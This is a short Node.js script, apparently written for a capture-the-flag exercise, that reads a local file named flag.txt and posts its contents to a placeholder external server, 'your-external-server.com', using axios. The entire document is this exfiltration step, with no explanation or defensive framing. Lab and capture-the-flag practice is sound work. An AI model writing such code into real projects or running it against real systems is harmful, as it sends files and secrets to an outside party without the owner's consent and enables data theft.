const fs = require('fs');
const axios = require('axios');

fs.readFile('flag.txt', 'utf8', (err, data) => {
    if (err) throw err;
    axios.post('http://your-external-server.com/flag', { flag: data });
});